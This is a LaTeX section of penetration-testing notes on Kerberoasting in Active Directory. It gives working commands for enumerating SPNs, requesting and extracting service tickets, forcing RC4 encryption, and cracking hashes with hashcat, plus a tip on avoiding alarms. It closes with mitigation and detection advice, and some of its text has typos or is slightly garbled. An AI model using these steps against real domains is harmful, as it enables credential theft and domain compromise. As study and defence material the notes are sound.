\subsection{Kerberoasting}
\label{kerberos:kerberoasting}

\url{https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/}

\subsubsection{Introduction}
This attack may be used for both lateral and vertical movement.

When  a domain account is configured to run a service (for example, IIS, MSSQL,
\ldots.), a \gls{win:SPN}~\ref{windows_knowledge:ad:kerberos:SPN} is  used to
associate the service with a login account. 

If a user  wants to access the resource, they receive a \verb+TGS+ signed with
the NTLM password hash of the account running the service.

Hackers can  then crack this hash offline and use it to gain access. 

Any user on the domain with a valid \verb+TGT+ can request a \verb+TGS+ for any
service with an \verb+SPN+. Note that there is no fix or patch beyond ensuring
that the password for the service accounts are sufficiently complex.

{\bf Note:} 
\begin{itemize}
    \item with ACL abuse attack it is also possible to associate a SPN to a user account
in order to gain access to his password.
    \item computer account SPN should be avoided (long random password).
\end{itemize}

Kerberoasting Major Steps:
\begin{enumerate}
    \item domain access 
    \item discover SPNs
    \item Request for TGS ticket for discovered SPN 
    \item Dump the TGS ticket 
    \item Convert into crackable format
    \item brutforce the hash (hashcat format 13100 or JtT format \verb+krb5tgs+)
    \item test authentication (rpcclient, crackmap \ldots)
\end{enumerate}

{\bf Post exploit}: PAC forgery

\subsubsection{From Linux}

\begin{itemize}
    \item GetUserSPNs~\ref{tool:impacket:GetUserSPNs}
    \item metasploit (from meterpreter 
        \verb+powershell_import Invoke-kerberoast.ps1+)
    \item PowerSheel Empire (module \verb+credentials/invoke_kerberoast+)
    \item Pypykatz
\end{itemize}


\subsubsection{From Windows}
{\bf Semi Manual method}
\begin{enumerate}
    \item {\bf setspn} to enumerate the SPN
\begin{verbatim}
setspn.exe -Q */*
\end{verbatim}

    \item retrieve the TGS with :
        \begin{itemize}
                \item PowerShell
        (\href{https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8}{System.IdentityModel}
        is a namespace that contains different classes for building security
    token services) 
\begin{verbatim}
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
\end{verbatim}
or for all services (bu will inculde computer accounts
\begin{verbatim}
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | `
    % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken ` 
    -ArgumentList $_.Context.PostContext[0].Trim() }
\end{verbatim}
                \item \verb+Powerview+~\ref{tool:powerview:Get-DomainGPO}
        \end{itemize}

    \item Extract Tickets from Memory with Mimikatz~\ref{tool:mimikatz:KRBDUmp}
    \item transfer file on Linux box~\ref{misc:file_transfert}
    \item Prepar the Base64 Blob for Cracking
\begin{verbatim}
echo "<BASE64_BLOB>" |  tr -d \\n
\end{verbatim}
    \item Place the Output into a File as .kirbi
\begin{verbatim}
cat encoded_file | base64 -d > sqldev.kirbi
\end{verbatim}
    \item Extract the Kerberos Ticket using kirbi2john.py
\begin{verbatim}
python2.7 kirbi2john.py sqldev.kirbi
\end{verbatim}
    \item Modifiy crack file for Hashcat
\begin{verbatim}
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' \
    crack_file > sqldev_tgs_hashcat
\end{verbatim}
    \item View the Prepared Hash
\begin{verbatim}
cat sqldev_tgs_hashcat
\end{verbatim}
    \item Crack the Hash with Hashcat
\begin{verbatim}
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
\end{verbatim}
\end{enumerate}

{\bf Automated: Rebeus }
See Rubeus~\ref{tool:rubeus}


{\bf Automated: Powerview}

Using
\href{https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1}{PowerView}
to Extract TGS Tickets.

\begin{verbatim}
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | `
    Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
\end{verbatim}

\subsubsection{A Note on Encryption Types}


Kerberoasting tools typically request RC4 encryption when performing the attack
and initiating TGS-REQ requests. This is because RC4 is weaker and easier to
crack offline using tools such as Hashcat than other encryption algorithms such
as AES-128 and AES-256. When performing Kerberoasting in most environments, we
will retrieve hashes that begin with \verb+$krb5tgs$23$*+, an RC4 (type 23)
encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash
or hash that begins with \verb+$krb5tgs$18$*+. While it is possible to crack
AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will
typically be significantly more time consuming than cracking an RC4 (type 23)
encrypted ticket, but still possible especially if a weak password is chosen.

Let's walk through an example.
\begin{verbatim}
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,`
    msds-supportedencryptiontypes
\end{verbatim}
\verb+msDS-SupportedEncryptionTypes+ value (see
    \href{https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797}{chart}:
\begin{itemize}
    \item 0: pecific encryption type is not defined and set to the default of
        \verb+RC4_HMAC_MD5+.
    \item 24: meaning that AES 128/256 encryption types are the only ones
    supported. (hashcat mode 19700)
\end{itemize}

We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4
encryption when requesting a new service ticket. The tool does this by
specifying RC4 encryption as the only algorithm we support in the body of the
TGS request. This may be a failsafe built-in to Active Directory for backward
compatibility. By using this flag, we can request an RC4 (type 23) encrypted
ticket that can be cracked much faster.

{\bf Note}: This does not work against a Windows Server 2019 Domain Controller,
regardless of the domain functional level. It will always return a service
ticket encrypted with the highest level of encryption supported by the target
account. This being said, in a domain with Domain Controllers running on Server
2016 or earlier (which is quite common), enabling AES will not partially
mitigate Kerberoasting by only returning AES encrypted tickets, which are much
more difficult to crack, but rather will allow an attacker to request an RC4
encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption
on an SPN account will result in us receiving an AES-256 (type 18) service
ticket, which is substantially more difficult (but not impossible) to crack,
especially if a relatively weak dictionary password is in use.

\subsubsection{Efficacy of the Attack}
Kerberoasting and the presence of SPNs do not guarantee any level of access.
There might be environment where a cracked TGS ticket grand Domain Admin
access straightway or provide credentials that help move down the path to
domain compromise. In other environment none of the ones that crack are for
privileged users, and the attack does not allow any additional access. 

Another case the attack can end up with non crackable TGS.

\subsubsection{Mitigation}
Use group managed service accounts~\ref{windows_knowledge:ad:security:gMSA}

To detect this attack, your only  native option is to monitor for event ID
4769, and look for a Ticket  Encryption Type of 0x17 - user to user
\verb+krb_tgt_reply+. You can find more  information on detecting Kerberoast attacks here.

\url{https://www.trustedsec.com/blog/art_of_kerberoast/}

\url{https://www.youtube.com/watch?v=PUyhlN-E5MU}

Some services are better than the other since due to performance they will not
check PAC signature against Kerberos. 

MSSQL is a good candidate and grant code execution on the target SQL server
(\verb+xp_cmdshell+)

try not to request all TGC since it will raise alarms.

Identify weak passwords SPNs 
